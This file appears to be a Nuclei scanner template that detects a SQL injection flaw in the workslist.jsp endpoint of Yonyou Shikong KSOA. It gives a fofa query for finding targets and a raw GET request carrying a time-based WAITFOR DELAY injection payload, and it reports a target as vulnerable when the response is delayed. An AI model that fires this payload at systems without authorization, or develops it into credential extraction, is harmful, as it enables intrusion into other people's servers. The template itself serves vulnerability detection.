id: YonYou-KSOA-workslist-SQL

info:
  name: "用友时空 KSOA workslist.jsp 接口 SQL 注入漏洞"
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="用友-时空KSOA"
    用友时空 KSOA workslist.jsp 接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
  reference:
    - 
  tags: 用友时空-KSOA

http:
  - raw:
      - |
        GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
        Host: {{Host}}
        Content-type:application/x-www-form-urlencoded

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration>=4 && duration<=5"